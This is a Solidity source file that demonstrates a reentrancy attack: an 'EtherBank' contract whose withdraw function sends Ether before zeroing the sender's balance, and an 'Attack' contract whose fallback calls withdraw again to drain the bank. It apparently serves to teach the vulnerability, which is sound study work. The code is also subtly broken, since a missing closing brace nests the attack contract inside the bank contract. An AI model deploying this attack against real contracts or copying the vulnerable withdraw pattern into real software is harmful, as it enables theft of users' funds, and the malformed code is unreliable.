// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.10;

//contract EtherBank where the ether will be deposited and withdrawed from

contract EtherBank {
    //mapping keeps track of the account addresses and the balance in it
    mapping(address => uint) public balances;

 //function to deposit ether 
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }


 //function to withdraw ether, it checks whether the account has enough ether
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

 //send the funds
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");


        //update the balance
        balances[msg.sender] = 0;
    }

     // helper function to get the balance of the contract EtherBank
    function getBalance() public view returns(uint){
        return address(this).balance;
        
        
}



//contract that will carry on the attack

contract Attack {
    EtherBank public etherbank;

    constructor(address _etherbankaddress) {
       etherbank = EtherBank (_etherbankaddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(etherbank).balance >= 1 ether) {
            etherbank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherbank.deposit{value: 1 ether}();
        etherbank.withdraw();
    }


 // helper function to get the balance of the contract EtherBank
    function getBalance() public view returns(uint){
        return address(this).balance;
    }


}
